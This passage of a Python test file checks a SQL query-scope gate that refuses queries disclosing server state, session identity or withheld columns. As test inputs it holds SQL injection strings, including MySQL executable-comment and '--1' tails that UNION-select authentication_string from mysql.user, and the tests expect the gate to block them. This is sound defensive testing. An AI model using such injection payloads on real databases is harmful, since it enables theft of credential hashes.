        "SELECT 1",
        "SELECT 'x' AS literal",
        "SELECT CURRENT_DATE",
    ],
)
def test_rejects_a_query_that_reads_no_catalog_relation(sql):
    """A row-returning query with no FROM reads server state rather than the
    catalog. Requiring one relation closes the whole no-table disclosure
    class, including built-in functions sqlglot models as first-class nodes
    (not Anonymous) that the function check cannot see.

    `SELECT VERSION()` is in test_server_state_cannot_ride_in_on_a_real_table:
    it is refused by name, which this rule cannot do once the query also
    names a table. CURRENT_DATE is here because it is refused ONLY by this
    rule -- it discloses nothing, so it is allowed alongside a real
    relation."""
    with pytest.raises(SqlScopeError, match="catalog relation"):
        check_query_scope(sql, platform="mysql")


def test_still_permits_a_catalog_query_with_functions_and_no_user_table():
    """The guard is 'names a catalog relation', not 'names no function' -- a
    normal catalog query full of standard functions is still fine."""
    check_query_scope(
        "SELECT LOWER(table_name), COUNT(*) FROM information_schema.columns "
        "GROUP BY table_name",
        platform="mysql",
    )


# --- renaming a withheld column instead of naming it -----------------------
#
# The withheld-column gate refuses the name where it is written, and the
# masker covers `SELECT *` where the driver's output names are the real ones.
# Three ways found by review to land between the two: rename the columns so
# `SELECT *` reports caller-chosen headers, put the name somewhere that is not
# an exp.Column, or read no relation at all.

_IDENTITY_SCOPE = CatalogScope(
    schemas=frozenset(),
    relations=frozenset({"account_usage.access_history", "account_usage.users"}),
)


@pytest.mark.parametrize(
    ("label", "sql"),
    [
        # A table alias may carry a column list, which renames positionally.
        # Under `SELECT *` no exp.Column names user_name, so the gate saw
        # nothing -- and the driver then reports a/b/c, so the masker matched
        # nothing either. Caller-chosen names on both layers at once.
        (
            "table alias column list",
            "SELECT * FROM snowflake.account_usage.access_history AS t(a, b, c)",
        ),
        (
            "derived table alias column list",
            "SELECT * FROM (SELECT * FROM snowflake.account_usage.access_history) "
            "AS t(a, b, c)",
        ),
    ],
)
def test_a_column_list_cannot_rename_a_withheld_column_out_of_sight(label, sql):
    with pytest.raises(SqlScopeError, match="rename"):
        check_query_scope(sql, platform="snowflake", scope=_IDENTITY_SCOPE)


def test_a_join_using_clause_cannot_name_a_withheld_column():
    """sqlglot stores USING names as Identifier, not Column, so the walk missed
    them. Joining on the name and returning a count answers "is this person
    here" one bit at a time, which is the same question the projection rule
    refuses."""
    with pytest.raises(SqlScopeError, match="names a person"):
        check_query_scope(
            "SELECT count(*) FROM snowflake.account_usage.access_history a "
            "JOIN snowflake.account_usage.users b USING (user_name)",
            platform="snowflake",
            scope=_IDENTITY_SCOPE,
        )


def test_a_cte_alias_is_not_a_catalog_relation():
    """The must-read-a-relation rule counted a CTE reference as a relation.

    Its own comment says it exists to close "the whole no-table disclosure
    class ... including built-in functions sqlglot models as first-class nodes
    that _check_functions cannot see" -- and a CTE alias parses as exp.Table,
    so wrapping the disclosure in a WITH satisfied the rule while reading
    nothing.
    """
    with pytest.raises(SqlScopeError, match="must read from a catalog relation"):
        check_query_scope("WITH x AS (SELECT 1) SELECT * FROM x", platform="snowflake")

    # And the shape that motivated it. Refused by the CURRENT_USER rule first,
    # so this asserts only that it does not get through.
    with pytest.raises(SqlScopeError):
        check_query_scope(
            "WITH x AS (SELECT CURRENT_USER) SELECT * FROM x", platform="snowflake"
        )


def test_current_user_is_server_state_wherever_it_appears():
    """The no-relation rule cannot reach this one: it rides along with a real
    catalog table, so something has to refuse the node itself."""
    with pytest.raises(SqlScopeError, match="session state"):
        check_query_scope(
            "SELECT CURRENT_USER, table_name FROM information_schema.tables",
            platform="snowflake",
        )


def test_a_cte_over_a_real_relation_still_works():
    """The converse, so the fix above cannot be 'refuse every WITH'."""
    check_query_scope(
        "WITH t AS (SELECT table_name FROM information_schema.tables) SELECT * FROM t",
        platform="postgres",
    )


@pytest.mark.parametrize(
    ("platform", "sql"),
    [
        ("postgres", "SELECT VERSION() FROM information_schema.tables"),
        ("postgres", "SELECT CURRENT_SCHEMA FROM information_schema.tables"),
        ("postgres", "SELECT SESSION_USER FROM information_schema.tables"),
        ("mysql", "SELECT VERSION() FROM information_schema.tables"),
        # And in a UNION branch, where the relation rule is satisfied by the
        # other branch.
        (
            "postgres",
            "SELECT table_name FROM information_schema.tables "
            "UNION ALL SELECT VERSION()",
        ),
    ],
)
def test_server_state_cannot_ride_in_on_a_real_table(platform, sql):
    """`@@version` is refused but `VERSION()` was not, which is the same fact.

    The must-read-a-relation rule cannot reach these: a real catalog table IS
    present, so the rule is satisfied and the tableless expression comes along.
    And _check_functions only sees exp.Anonymous, while sqlglot models these as
    first-class nodes -- which is exactly the gap that rule's own comment says
    it exists to cover, and cannot when the query also names a table.
    """
    with pytest.raises(SqlScopeError, match="state"):
        check_query_scope(sql, platform=platform)


def test_a_harmless_builtin_is_still_allowed():
    """The fix is about identity and configuration, not about every builtin.
    CURRENT_DATE discloses nothing and a catalog query may legitimately filter
    on it."""
    check_query_scope(
        "SELECT table_name FROM information_schema.tables WHERE created > CURRENT_DATE",
        platform="postgres",
    )


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT count(*) FROM snowflake.account_usage.access_history "
        "NATURAL JOIN snowflake.account_usage.users",
        "SELECT count(*) FROM snowflake.account_usage.access_history "
        "NATURAL LEFT JOIN snowflake.account_usage.users",
    ],
)
def test_a_natural_join_cannot_join_on_a_withheld_column(sql):
    """The implicit form of the USING hole, and the reason that fix was not
    finished.

    NATURAL JOIN joins on every commonly-named column without naming any of
    them, so the walk that now catches `USING (user_name)` sees nothing --
    while access_history and users share exactly that column, and a count
    over the join answers "is this person here" just as directly.

    Refused rather than resolved: knowing which columns two relations share
    needs their schemas, which this gate does not have and must not guess at.
    An explicit ON or USING says what it joins on and is still accepted.
    """
    with pytest.raises(SqlScopeError, match="NATURAL"):
        check_query_scope(sql, platform="snowflake", scope=_IDENTITY_SCOPE)


def test_an_explicit_join_is_still_allowed():
    """The control: the refusal is of the implicit form, not of joins."""
    check_query_scope(
        "SELECT count(*) FROM snowflake.account_usage.access_history a "
        "JOIN snowflake.account_usage.users b ON a.query_id = b.name",
        platform="snowflake",
        scope=_IDENTITY_SCOPE,
    )


@pytest.mark.parametrize(
    "tail",
    [
        "/*! UNION SELECT authentication_string FROM mysql.user */",
        "/*!50000 UNION SELECT authentication_string FROM mysql.user */",
        "--1 UNION SELECT authentication_string FROM mysql.user",
        "# trailing note",
    ],
    ids=["executable-comment", "versioned-comment", "dash-dash-digit", "hash"],
)
def test_rejects_a_comment_the_engine_may_run(tail):
    # MySQL executes /*! ... */ and reads --1 as - -1, but the gate checks
    # sqlglot's tree, where each of these is only a comment.
    with pytest.raises(SqlScopeError):
        check_query_scope(f"{CATALOG_QUERY} {tail}", platform="mysql")


def test_rejects_an_optimizer_hint():
    with pytest.raises(SqlScopeError):
        check_query_scope(
            "SELECT /*+ MAX_EXECUTION_TIME(1) */ table_name "
            "FROM information_schema.tables",
            platform="mysql",
        )


def test_comment_characters_inside_a_string_literal_are_allowed():
    check_query_scope(
        "SELECT table_name FROM information_schema.tables "
        "WHERE table_name = 'a /* b */ c'",
        platform="mysql",
    )
